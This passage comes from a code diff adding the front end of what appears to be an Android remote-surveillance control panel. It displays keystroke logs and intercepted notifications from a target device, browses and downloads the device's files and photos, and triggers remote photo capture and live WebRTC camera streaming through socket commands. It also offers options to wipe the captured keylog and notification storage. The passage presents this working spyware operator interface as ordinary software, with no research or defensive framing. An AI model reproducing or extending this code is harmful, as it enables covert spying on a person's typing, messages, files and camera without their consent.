+                                    return (a.appName || a.app || '').localeCompare(b.appName || b.app || '');
+                                default:
+                                    return 0;
+                            }
+                        });
+                        
+                        content.innerHTML = `
+                            <div class="apps-controls">
+                                <div class="apps-controls-row">
+                                    <div class="apps-search">
+                                        <span class="apps-search-icon">🔍</span>
+                                        <input type="text" 
+                                               placeholder="Search keylogs by app or text..." 
+                                               value="${keylogSearch}"
+                                               onkeyup="filterKeylogs(this.value)">
+                                    </div>
+                                    <div class="apps-sort">
+                                        <select onchange="sortKeylogs(this.value)">
+                                            <option value="date-desc" ${keylogSort === 'date-desc' ? 'selected' : ''}>Latest First</option>
+                                            <option value="date-asc" ${keylogSort === 'date-asc' ? 'selected' : ''}>Oldest First</option>
+                                            <option value="app-asc" ${keylogSort === 'app-asc' ? 'selected' : ''}>By App Name</option>
+                                        </select>
+                                    </div>
+                                </div>
+                                <div class="apps-controls-row">
+                                    <span class="apps-filter-label">Date Range:</span>
+                                    <input type="date" id="keylogStartDate" placeholder="Start Date" style="margin-right: 8px; padding: 6px;">
+                                    <input type="date" id="keylogEndDate" placeholder="End Date" style="margin-right: 8px; padding: 6px;">
+                                    <button class="filter-btn" onclick="loadKeylogsByDate()">Load Range</button>
+                                    <button class="filter-btn" onclick="loadTestKeylogData()" style="margin-left: 8px; background: #28a745; color: white;">🧪 Load Test Data</button>
+                                    <button class="filter-btn" onclick="getKeylogInfo()" style="margin-left: 8px;">📊 Storage Info</button>
+                                    <button class="filter-btn" style="margin-left: 8px; background: #dc3545; color: white;" onclick="clearKeylogStorage()">🗑️ Clear All</button>
+                                </div>
+                                <div class="apps-controls-row">
+                                    <span class="apps-filter-label">Filter by App:</span>
+                                    <div class="apps-filter-group">
+                                        <button class="filter-btn ${keylogAppFilter === 'all' ? 'active' : ''}" 
+                                                onclick="setKeylogAppFilter('all')">All (${keylogData.length})</button>
+                                        ${uniqueApps.slice(0, 5).map(app => `
+                                            <button class="filter-btn ${keylogAppFilter === app ? 'active' : ''}" 
+                                                    onclick="setKeylogAppFilter('${escapeHtml(app)}')">${escapeHtml(app)} (${keylogData.filter(k => (k.appName || k.app) === app).length})</button>
+                                        `).join('')}
+                                    </div>
+                                    ${keylogSearch || keylogAppFilter !== 'all' ? `<span class="apps-stats">Showing <strong>${filteredKeylogs.length}</strong> of <strong>${keylogData.length}</strong> entries</span>` : ''}
+                                </div>
+                            </div>
+                            <div class="keylog-timeline">${filteredKeylogs.map(keylog => `
+                                <div class="keylog-item">
+                                    <div class="keylog-header">
+                                        <div class="keylog-app">⌨️ ${escapeHtml(keylog.appName || keylog.app || 'Unknown')}</div>
+                                        <div class="keylog-time">${formatDate(keylog.timestamp)}</div>
+                                    </div>
+                                    <div class="keylog-text">${escapeHtml(keylog.text || keylog.key || 'No data')}</div>
+                                </div>
+                            `).join('')}</div>
+                        `;
+                    } else {
+                        content.innerHTML = '<div class="empty-data">No keylog data. Start the keylogger on the device.</div>';
+                    }
+                    break;
+                
+                case 'notifications':
+                    const notifications = Array.isArray(data) ? data : [];
+                    if (notifications.length > 0) {
+                        // Get unique apps
+                        const uniqueNotifApps = [...new Set(notifications.map(n => n.appName || n.app || 'Unknown'))].sort();
+                        
+                        // Filter notifications
+                        let filteredNotifs = notifications.filter(notif => {
+                            // Apply app filter
+                            const appName = notif.appName || notif.app || 'Unknown';
+                            if (notifAppFilter !== 'all' && appName !== notifAppFilter) return false;
+                            
+                            // Apply search
+                            if (notifSearch) {
+                                const searchLower = notifSearch.toLowerCase();
+                                return (appName).toLowerCase().includes(searchLower) ||
+                                       (notif.title || '').toLowerCase().includes(searchLower) ||
+                                       (notif.text || '').toLowerCase().includes(searchLower);
+                            }
+                            return true;
+                        });
+                        
+                        // Apply sort
+                        filteredNotifs.sort((a, b) => {
+                            switch (notifSort) {
+                                case 'date-desc':
+                                    return (b.timestamp || 0) - (a.timestamp || 0);
+                                case 'date-asc':
+                                    return (a.timestamp || 0) - (b.timestamp || 0);
+                                default:
+                                    return 0;
+                            }
+                        });
+                        
+                        content.innerHTML = `
+                            <div class="apps-controls">
+                                <div class="apps-controls-row">
+                                    <div class="apps-search">
+                                        <span class="apps-search-icon">🔍</span>
+                                        <input type="text" 
+                                               placeholder="Search notifications by app, title or text..." 
+                                               value="${notifSearch}"
+                                               onkeyup="filterNotifications(this.value)">
+                                    </div>
+                                    <div class="apps-sort">
+                                        <select onchange="sortNotifications(this.value)">
+                                            <option value="date-desc" ${notifSort === 'date-desc' ? 'selected' : ''}>Latest First</option>
+                                            <option value="date-asc" ${notifSort === 'date-asc' ? 'selected' : ''}>Oldest First</option>
+                                        </select>
+                                    </div>
+                                </div>
+                                <div class="apps-controls-row">
+                                    <span class="apps-filter-label">Date Range:</span>
+                                    <input type="date" id="notifStartDate" placeholder="Start Date" style="margin-right: 8px; padding: 6px;">
+                                    <input type="date" id="notifEndDate" placeholder="End Date" style="margin-right: 8px; padding: 6px;">
+                                    <button class="filter-btn" onclick="loadNotificationsByDate()">Load Range</button>
+                                    <button class="filter-btn" onclick="getNotificationInfo()" style="margin-left: 8px;">📊 Storage Info</button>
+                                    <button class="filter-btn" style="margin-left: 8px; background: #dc3545; color: white;" onclick="clearNotificationStorage()">🗑️ Clear All</button>
+                                </div>
+                                <div class="apps-controls-row">
+                                    <span class="apps-filter-label">Filter by App:</span>
+                                    <div class="apps-filter-group">
+                                        <button class="filter-btn ${notifAppFilter === 'all' ? 'active' : ''}" 
+                                                onclick="setNotifAppFilter('all')">All (${notifications.length})</button>
+                                        ${uniqueNotifApps.slice(0, 5).map(app => `
+                                            <button class="filter-btn ${notifAppFilter === app ? 'active' : ''}" 
+                                                    onclick="setNotifAppFilter('${escapeHtml(app)}')">${escapeHtml(app)} (${notifications.filter(n => (n.appName || n.app) === app).length})</button>
+                                        `).join('')}
+                                    </div>
+                                    ${notifSearch || notifAppFilter !== 'all' ? `<span class="apps-stats">Showing <strong>${filteredNotifs.length}</strong> of <strong>${notifications.length}</strong> notifications</span>` : ''}
+                                </div>
+                            </div>
+                            <div class="notif-list">${filteredNotifs.map(notif => `
+                                <div class="notif-item">
+                                    <div class="notif-icon">🔔</div>
+                                    <div class="notif-content">
+                                        <div class="notif-header">
+                                            <div class="notif-app">${escapeHtml(notif.appName || notif.app || 'Unknown')}</div>
+                                            <div class="notif-time">${formatDate(notif.timestamp)}</div>
+                                        </div>
+                                        ${notif.title ? `<div class="notif-title">${escapeHtml(notif.title)}</div>` : ''}
+                                        <div class="notif-text">${escapeHtml(notif.text || notif.message || 'No content')}</div>
+                                    </div>
+                                </div>
+                            `).join('')}</div>
+                        `;
+                    } else {
+                        content.innerHTML = '<div class="empty-data">No notifications data</div>';
+                    }
+                    break;
+                    
+                default:
+                    content.innerHTML = `<div class="data-item"><pre>${JSON.stringify(data, null, 2)}</pre></div>`;
+            }
+        }
+        
+        // Tab click handlers
+        document.getElementById('dataTabs').addEventListener('click', (e) => {
+            if (e.target.classList.contains('tab-btn')) {
+                setActiveTab(e.target.dataset.tab);
+            }
+        });
+        
+        // Helper functions
+        function formatDate(timestamp) {
+            if (!timestamp) return 'Unknown';
+            const date = new Date(parseInt(timestamp));
+            return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
+        }
+        
+        function formatFileSize(bytes) {
+            if (!bytes || bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        }
+        
+        // Image Modal
+        let currentImageIndex = 0;
+        function openImageModal(index) {
+            currentImageIndex = index;
+            const photos = deviceData.photos || [];
+            if (index >= photos.length) return;
+            
+            const photo = photos[index];
+            const modal = document.createElement('div');
+            modal.className = 'image-modal';
+            modal.id = 'imageModal';
+            modal.innerHTML = `
+                <div class="modal-content">
+                    <span class="close-modal" onclick="closeImageModal()">&times;</span>
+                    <img src="data:image/jpeg;base64,${photo.image64}" class="modal-image" alt="${photo.name}">
+                    <div class="modal-controls">
+                        <button class="modal-btn" onclick="downloadImage(${index})">Download</button>
+                        <button class="modal-btn" onclick="prevImage()" ${index === 0 ? 'disabled' : ''}>Previous</button>
+                        <button class="modal-btn" onclick="nextImage()" ${index === photos.length - 1 ? 'disabled' : ''}>Next</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+            
+            // Close on ESC or click outside
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) closeImageModal();
+            });
+            document.addEventListener('keydown', modalKeyHandler);
+        }
+        
+        function closeImageModal() {
+            const modal = document.getElementById('imageModal');
+            if (modal) {
+                modal.remove();
+                document.removeEventListener('keydown', modalKeyHandler);
+            }
+        }
+        
+        function modalKeyHandler(e) {
+            if (e.key === 'Escape') closeImageModal();
+            if (e.key === 'ArrowLeft') prevImage();
+            if (e.key === 'ArrowRight') nextImage();
+        }
+        
+        function prevImage() {
+            const photos = deviceData.photos || [];
+            if (currentImageIndex > 0) {
+                closeImageModal();
+                openImageModal(currentImageIndex - 1);
+            }
+        }
+        
+        function nextImage() {
+            const photos = deviceData.photos || [];
+            if (currentImageIndex < photos.length - 1) {
+                closeImageModal();
+                openImageModal(currentImageIndex + 1);
+            }
+        }
+        
+        function downloadImage(index) {
+            const photos = deviceData.photos || [];
+            if (index >= photos.length) return;
+            
+            const photo = photos[index];
+            const link = document.createElement('a');
+            link.href = 'data:image/jpeg;base64,' + photo.image64;
+            link.download = photo.name || `photo_${index}.jpg`;
+            link.click();
+        }
+        
+        // File operations
+        function browseDirectory(path) {
+            if (!socket || !currentDevice) return;
+            console.log('Browsing directory:', path);
+            currentFilePath = path;
+            showProgress('Loading folder...');
+            socket.emit('adminCommand', {
+                command: 'getFiles',
+                targetUniqueId: currentDevice.uniqueId || currentDevice.uid,
+                path: path
+            });
+            // Hide progress after 3 seconds in case of no response
+            setTimeout(() => hideProgress(), 3000);
+        }
+        
+        function downloadFile(path, name) {
+            if (!socket || !currentDevice) return;
+            console.log('Downloading file:', path);
+            socket.emit('adminCommand', {
+                command: 'downloadFile',
+                targetUniqueId: currentDevice.uniqueId || currentDevice.uid,
+                path: path,
+                fileName: name
+            });
+            showProgress(`Downloading ${name}...`);
+            setTimeout(() => hideProgress(), 5000);
+        }
+        
+        function downloadAudio(fileName, audioData) {
+            try {
+                const byteCharacters = atob(audioData);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: 'audio/mp4' });
+                const url = window.URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = fileName;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                window.URL.revokeObjectURL(url);
+            } catch (e) {
+                console.error('Download error:', e);
+                alert('Failed to download audio: ' + e.message);
+            }
+        }
+        
+        function downloadPhoto(fileName, imageData) {
+            try {
+                const byteCharacters = atob(imageData);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], { type: 'image/jpeg' });
+                const url = window.URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = fileName;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                window.URL.revokeObjectURL(url);
+            } catch (e) {
+                console.error('Download error:', e);
+                alert('Failed to download photo: ' + e.message);
+            }
+        }
+        
+        function filterApps(searchTerm) {
+            appsSearch = searchTerm;
+            renderData();
+        }
+        
+        // Camera control functions
+        let liveCameraInterval = null;
+        let currentLiveCameraType = 'back';
+        
+        function takeCameraPhoto(cameraType) {
+            console.log('takeCameraPhoto called with:', cameraType);
+            console.log('Socket:', socket);
+            console.log('Current device:', currentDevice);
+            
+            if (!socket || !currentDevice) {
+                alert('No device connected. Socket: ' + !!socket + ', Device: ' + !!currentDevice);
+                return;
+            }
+            
+            showProgress(`Taking photo with ${cameraType} camera...`);
+            
+            const commandData = {
+                command: 'streamCamera',
+                targetUniqueId: currentDevice.uniqueId || currentDevice.uid,
+                cameraType: cameraType
+            };
+            
+            console.log('Emitting adminCommand:', commandData);
+            socket.emit('adminCommand', commandData);
+            
+            setTimeout(() => hideProgress(), 8000);
+        }
+        
+        function startLiveCamera(cameraType) {
+            if (!socket || !currentDevice) {
+                alert('No device connected');
+                return;
+            }
+            
+            currentLiveCameraType = cameraType;
+            
+            // Show live camera feed container
+            const feedContainer = document.getElementById('liveCameraFeed');
+            if (feedContainer) {
+                feedContainer.style.display = 'block';
+                document.getElementById('liveCameraType').textContent = cameraType.charAt(0).toUpperCase() + cameraType.slice(1);
+            }
+            
+            // Clear any existing interval
+            if (liveCameraInterval) {
+                clearInterval(liveCameraInterval);
+            }
+            
+            // Function to request new frame
+            const requestFrame = () => {
+                socket.emit('adminCommand', {
+                    command: 'streamCamera',
+                    targetUniqueId: currentDevice.uniqueId || currentDevice.uid,
+                    cameraType: cameraType,
+                    isLiveStream: true
+                });
+            };
+            
+            // Request first frame immediately
+            requestFrame();
+            
+            // Then request frames every 2 seconds
+            liveCameraInterval = setInterval(requestFrame, 2000);
+            
+            // Update the stream container with loading state
+            const streamContainer = document.getElementById('liveCameraStream');
+            if (streamContainer) {
+                streamContainer.innerHTML = `
+                    <div style="text-align: center; padding: 40px;">
+                        <div class="spinner" style="margin: 0 auto 16px;"></div>
+                        <p style="color: var(--text-muted);">Starting live stream from ${cameraType} camera...</p>
+                        <p style="color: var(--text-muted); font-size: 14px;">Frames update every 2 seconds</p>
+                    </div>
+                `;
+            }
+            
+            alert(`📹 Live camera started!\n\nCamera: ${cameraType}\nStream updates every 2 seconds`);
+        }
+        
+        function stopLiveCamera() {
+            if (liveCameraInterval) {
+                clearInterval(liveCameraInterval);
+                liveCameraInterval = null;
+            }
+            
+            const feedContainer = document.getElementById('liveCameraFeed');
+            if (feedContainer) {
+                feedContainer.style.display = 'none';
+            }
+            
+            const streamContainer = document.getElementById('liveCameraStream');
+            if (streamContainer) {
+                streamContainer.innerHTML = `
+                    <div style="text-align: center; padding: 40px; color: var(--text-muted);">
+                        <p>Live stream stopped</p>
+                    </div>
+                `;
+            }
+            
+            alert('⏹️ Live camera stopped');
+        }
+        
+        function switchCamera() {
+            if (liveCameraInterval) {
+                // If live streaming, switch the stream
+                currentLiveCameraType = currentLiveCameraType === 'back' ? 'front' : 'back';
+                stopLiveCamera();
+                setTimeout(() => startLiveCamera(currentLiveCameraType), 500);
+            } else {
+                // If not streaming, just take a photo with the other camera
+                const newCamera = currentLiveCameraType === 'back' ? 'front' : 'back';
+                takeCameraPhoto(newCamera);
+                currentLiveCameraType = newCamera;
+            }
+        }
+        
+        // ===== WebRTC Functions =====
+        let peerConnection = null;
+        let currentWebRTCCamera = 'back';
+        
+        function startWebRTCStream(cameraType) {
+            if (!socket || !currentDevice) {
+                alert('No device connected');
+                return;
+            }
+            
+            console.log('Starting WebRTC stream for', cameraType);
+            console.log('Current device:', currentDevice);
+            currentWebRTCCamera = cameraType;
+            
+            // Show video container
+            const container = document.getElementById('webrtcVideoContainer');
+            if (container) {
+                container.style.display = 'block';
+                document.getElementById('webrtcCameraType').textContent = 
+                    cameraType.charAt(0).toUpperCase() + cameraType.slice(1);
+            }
+            
+            updateWebRTCStatus('🔄 Initializing...');
+            
+            // Setup WebRTC FIRST - before sending command
+            setupWebRTC();
+            
+            // Small delay to ensure listeners are set up before Android responds
+            setTimeout(() => {
+                // Send command to Android to start streaming
+                console.log('Sending startWebRTCStream command to:', currentDevice.uniqueId || currentDevice.uid);
+                socket.emit('adminCommand', {
+                    command: 'startWebRTCStream',
+                    targetUniqueId: currentDevice.uniqueId || currentDevice.uid,
+                    cameraType: cameraType
+                });
+            }, 100);
+        }
+        
+        function setupWebRTC() {
+            // Create peer connection with ICE servers
+            const configuration = {
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' }
+                ]
+            };
+            
+            peerConnection = new RTCPeerConnection(configuration);
+            
+            // Handle incoming video track
+            peerConnection.ontrack = (event) => {
+                console.log('WebRTC: Received video track');
+                const video = document.getElementById('webrtcVideo');
+                if (video && event.streams[0]) {
+                    video.srcObject = event.streams[0];
+                    updateWebRTCStatus('🟢 Connected');
+                }
+            };
+            
+            // Handle ICE candidates
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    console.log('WebRTC: Sending ICE candidate to peer');
+                    socket.emit('webrtc-ice-candidate-admin', {
+                        uid: currentDevice.uniqueId || currentDevice.uid,
+                        candidate: {
+                            candidate: event.candidate.candidate,
+                            sdpMLineIndex: event.candidate.sdpMLineIndex,
+                            sdpMid: event.candidate.sdpMid
+                        }
+                    });
+                }
+            };
+            
+            // Handle connection state
+            peerConnection.onconnectionstatechange = () => {
+                console.log('WebRTC connection state:', peerConnection.connectionState);
+                switch(peerConnection.connectionState) {
+                    case 'connected':
+                        updateWebRTCStatus('🟢 Connected');
+                        break;
+                    case 'disconnected':
+                        updateWebRTCStatus('🟡 Disconnected');
+                        break;
+                    case 'failed':
+                        updateWebRTCStatus('🔴 Failed');
+                        break;
+                    case 'connecting':
+                        updateWebRTCStatus('🔄 Connecting...');
+                        break;
+                }
+            };
+            
+            // Setup socket handlers for WebRTC signaling
+            // Remove only the specific handler if already set, not ALL handlers
+            if (window.webrtcOfferHandler) {
+                socket.off('webrtc-offer', window.webrtcOfferHandler);
+            }
+            window.webrtcOfferHandler = handleWebRTCOffer;
+            socket.on('webrtc-offer', window.webrtcOfferHandler);
+            
+            if (window.webrtcIceCandidateHandler) {
+                socket.off('webrtc-ice-candidate', window.webrtcIceCandidateHandler);
+            }
+            window.webrtcIceCandidateHandler = handleWebRTCIceCandidate;
+            socket.on('webrtc-ice-candidate', window.webrtcIceCandidateHandler);
+            
+            if (window.webrtcErrorHandler) {
+                socket.off('webrtc-error', window.webrtcErrorHandler);
+            }
+            window.webrtcErrorHandler = (data) => {
+                console.error('WebRTC Error from device:', data.error);
+                updateWebRTCStatus('🔴 Error: ' + data.error);
+            };
+            socket.on('webrtc-error', window.webrtcErrorHandler);
+            
+            console.log('WebRTC: Socket handlers setup complete, waiting for offer...');
+        }
+        
+        async function handleWebRTCOffer(data) {
+            console.log('WebRTC: handleWebRTCOffer called with data:', data);
+            
+            if (!peerConnection) {
+                console.error('WebRTC: No peer connection available');
+                return;
+            }
+            
+            console.log('WebRTC: Received offer from device');
+            updateWebRTCStatus('🔄 Establishing connection...');
+            
+            try {
+                const offer = new RTCSessionDescription({
+                    type: data.offer.type,
+                    sdp: data.offer.sdp
+                });
+                
+                await peerConnection.setRemoteDescription(offer);
+                console.log('WebRTC: Remote description set');
+                
+                // Create answer
+                const answer = await peerConnection.createAnswer();
+                await peerConnection.setLocalDescription(answer);
+                console.log('WebRTC: Local description set');
+                
+                // Send answer back to device
+                socket.emit('webrtc-answer', {
+                    uid: currentDevice.uniqueId || currentDevice.uid,
+                    answer: {
+                        type: answer.type,
+                        sdp: answer.sdp
+                    }
+                });
+                
+                console.log('WebRTC: Answer sent to device');
+            } catch (error) {
+                console.error('WebRTC error:', error);
+                updateWebRTCStatus('🔴 Connection failed');
+            }
+        }
+        
+        function handleWebRTCIceCandidate(data) {
+            if (!peerConnection) return;
+            
+            try {
+                const candidate = new RTCIceCandidate({
+                    candidate: data.candidate.candidate,
+                    sdpMLineIndex: data.candidate.sdpMLineIndex,
+                    sdpMid: data.candidate.sdpMid
+                });
+                
+                peerConnection.addIceCandidate(candidate);
+                console.log('WebRTC: ICE candidate added');
+            } catch (error) {
+                console.error('WebRTC: Error adding ICE candidate:', error);
+            }
+        }
+        
+        function updateWebRTCStatus(status) {
+            const statusEl = document.getElementById('webrtcStatus');
+            if (statusEl) {
+                statusEl.textContent = status;
+            }
+        }
+        
+        function stopWebRTCStream() {
+            console.log('Stopping WebRTC stream');
+            
+            // Close peer connection
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+            
+            // Stop video
+            const video = document.getElementById('webrtcVideo');
+            if (video && video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+                video.srcObject = null;
+            }
+            
+            // Hide container
+            const container = document.getElementById('webrtcVideoContainer');
+            if (container) {
+                container.style.display = 'none';
+            }
+            
+            // Send stop command to Android
+            if (socket && currentDevice) {
+                socket.emit('adminCommand', {
+                    command: 'stopWebRTCStream',
+                    targetUniqueId: currentDevice.uniqueId || currentDevice.uid
+                });
+            }
+            
+            alert('⏹️ WebRTC stream stopped');
+        }
+        
+        function switchWebRTCCamera() {
+            if (peerConnection) {
+                // Stop current stream
+                stopWebRTCStream();
+                
+                // Switch camera and restart
+                currentWebRTCCamera = currentWebRTCCamera === 'back' ? 'front' : 'back';
+                setTimeout(() => startWebRTCStream(currentWebRTCCamera), 500);
+            }
+        }
+        
+        function setAppsFilter(filter) {
+            appsFilter = filter;
+            renderData();
+        }
+        
+        function sortApps(sortBy) {
+            appsSort = sortBy;
+            renderData();
+        }
+        
+        function filterKeylogs(searchTerm) {
+            keylogSearch = searchTerm;
+            renderData();
+        }
+        
+        function setKeylogAppFilter(app) {
+            keylogAppFilter = app;
+            renderData();
+        }
+        
+        function sortKeylogs(sortBy) {
+            keylogSort = sortBy;
+            renderData();
+        }
+        
+        function filterNotifications(searchTerm) {
+            notifSearch = searchTerm;
+            renderData();
+        }
+        
+        function setNotifAppFilter(app) {
+            notifAppFilter = app;
+            renderData();
+        }
+        
+        function sortNotifications(sortBy) {
+            notifSort = sortBy;
+            renderData();
+        }
+        
+        // Keylog date range and storage management functions
+        function loadTestKeylogData() {
+            console.log('Loading test keylog data...');
+            console.log('Current activeTab:', activeTab);
+            console.log('Current deviceData.keylog:', deviceData.keylog);
+            
+            // Fetch test data from API
+            fetch('http://localhost:3001/api/test/keylog-sample')
+                .then(response => {
+                    console.log('Response received:', response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Test data loaded:', data);
+                    console.log('Keylogs array:', data.keylogs);
+                    
+                    // Store the keylogs
+                    deviceData.keylog = data.keylogs || [];
+                    
+                    console.log('deviceData.keylog after assignment:', deviceData.keylog);
+                    console.log('Length:', deviceData.keylog.length);
+                    
+                    // Force render if on keylog tab
+                    if (activeTab === 'keylog') {
+                        console.log('Rendering keylog data...');
+                        renderData();
+                    } else {
+                        console.log('Not on keylog tab, current tab:', activeTab);
+                    }
+                    
+                    alert(`✅ Loaded ${deviceData.keylog.length} test keylog entries!\n\nApps: ${data.keylogs.map(k => k.appName).join(', ')}`);
+                })
+                .catch(error => {
+                    console.error('Error loading test data:', error);
+                    alert('❌ Failed to load test data.\n\nError: ' + error.message + '\n\nMake sure server is running on port 3001.');
+                });
+        }
+        
+        function loadKeylogsByDate() {
+            const startDate = document.getElementById('keylogStartDate').value;
+            const endDate = document.getElementById('keylogEndDate').value;
+            
+            if (!currentDevice) {
+                alert('No device selected');
+                return;
+            }
+            
+            const command = {
+                command: 'getKeylog',
+                arg1: 'get',
+                arg2: startDate || '',
+                arg3: endDate || ''
+            };
+            
+            socket.emit('commands', {
+                uniqueId: currentDevice.uniqueId,
+                commandData: command
+            });
+            
+            showProgress('Loading keylogs for date range...');
+        }
+        
+        function getKeylogInfo() {
+            if (!currentDevice) {
+                alert('No device selected');
+                return;
+            }
+            
+            const command = {
+                command: 'getKeylog',
+                arg1: 'info'
+            };
+            
+            socket.emit('commands', {
+                uniqueId: currentDevice.uniqueId,
+                commandData: command
+            });
+            
+            showProgress('Fetching storage info...');
+        }
+        
+        function clearKeylogStorage() {
+            if (!currentDevice) {
+                alert('No device selected');
+                return;
+            }
+            
+            if (!confirm('Are you sure you want to clear ALL keylog storage? This cannot be undone.')) {
+                return;
+            }
+            
+            const command = {
+                command: 'getKeylog',
+                arg1: 'clear',
+                arg2: '' // Empty means clear all
+            };
+            
+            socket.emit('commands', {
+                uniqueId: currentDevice.uniqueId,
+                commandData: command
+            });
+            
+            showProgress('Clearing keylog storage...');
+        }
+        
+        // Notification date range and storage management functions
+        function loadNotificationsByDate() {
+            const startDate = document.getElementById('notifStartDate').value;
+            const endDate = document.getElementById('notifEndDate').value;
+            
+            if (!currentDevice) {
+                alert('No device selected');
+                return;
+            }
+            
+            const command = {
+                command: 'getNotifications',
+                arg1: 'get',
+                arg2: startDate || '',
+                arg3: endDate || ''
+            };
+            
+            socket.emit('commands', {
+                uniqueId: currentDevice.uniqueId,
+                commandData: command
+            });
+            
+            showProgress('Loading notifications for date range...');
+        }
+        
+        function getNotificationInfo() {
+            if (!currentDevice) {
+                alert('No device selected');
+                return;
+            }
+            
+            const command = {
+                command: 'getNotifications',
+                arg1: 'info'
+            };
+            
+            socket.emit('commands', {
+                uniqueId: currentDevice.uniqueId,
+                commandData: command
+            });
+            
+            showProgress('Fetching storage info...');
+        }
+        
+        function clearNotificationStorage() {
+            if (!currentDevice) {
+                alert('No device selected');
+                return;
+            }
+            
+            if (!confirm('Are you sure you want to clear ALL notification storage? This cannot be undone.')) {
+                return;
+            }
+            
+            const command = {
+                command: 'getNotifications',
+                arg1: 'clear',
+                arg2: '' // Empty means clear all
+            };
+            
+            socket.emit('commands', {
+                uniqueId: currentDevice.uniqueId,
+                commandData: command
+            });
+            
+            showProgress('Clearing notification storage...');
+        }
+        
+        // Breadcrumb navigation
+        function renderBreadcrumb() {
+            if (!currentFilePath || currentFilePath === '/') {
+                return '<div class="files-breadcrumb"><span class="breadcrumb-current">Root</span></div>';
+            }
+            
+            const parts = currentFilePath.split('/').filter(p => p);
+            let breadcrumbHTML = '<div class="files-breadcrumb">';
+            breadcrumbHTML += '<span class="breadcrumb-item" onclick="browseDirectory(\'/\')">Root</span>';
+            
+            let currentPath = '';
+            parts.forEach((part, index) => {
+                currentPath += '/' + part;
+                const isLast = index === parts.length - 1;
+                breadcrumbHTML += '<span class="breadcrumb-separator">/</span>';
+                if (isLast) {
+                    breadcrumbHTML += `<span class="breadcrumb-current">${escapeHtml(part)}</span>`;
+                } else {
+                    const pathToNavigate = currentPath;
+                    breadcrumbHTML += `<span class="breadcrumb-item" onclick="browseDirectory('${escapeHtml(pathToNavigate)}')">${escapeHtml(part)}</span>`;
+                }
+            });
+            
+            breadcrumbHTML += '</div>';
+            return breadcrumbHTML;
+        }
+        
+        // Get appropriate icon for file type
+        function getFileIcon(filename) {
+            if (!filename) return '📄';
+            const ext = filename.split('.').pop().toLowerCase();
+            const iconMap = {
+                'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'bmp': '🖼️',
+                'mp4': '🎬', 'avi': '🎬', 'mkv': '🎬', 'mov': '🎬',
+                'mp3': '🎵', 'wav': '🎵', 'm4a': '🎵', 'flac': '🎵',
+                'pdf': '📕', 'doc': '📘', 'docx': '📘', 'txt': '📝',
+                'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦',
+                'apk': '📱', 'exe': '⚙️', 'json': '📋', 'xml': '📋'
+            };
+            return iconMap[ext] || '📄';
+        }
+        
+        // HTML escape to prevent XSS
+        function escapeHtml(text) {
+            if (!text) return '';
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        // Progress indicator
+        function showProgress(message) {
+            const content = document.getElementById('dataContent');
+            const existing = document.getElementById('progressIndicator');
+            if (existing) {
+                existing.textContent = message;
+            } else {
+                const progress = document.createElement('div');
+                progress.id = 'progressIndicator';
+                progress.className = 'progress-text';
+                progress.textContent = message;
+                content.insertBefore(progress, content.firstChild);
+            }
+        }
+        
+        function hideProgress() {
+            const progress = document.getElementById('progressIndicator');
+            if (progress) progress.remove();
+        }
+        
+        // Initialize
+        renderCommands();
+        initSocket();
+    </script>
+</body>
+</html>
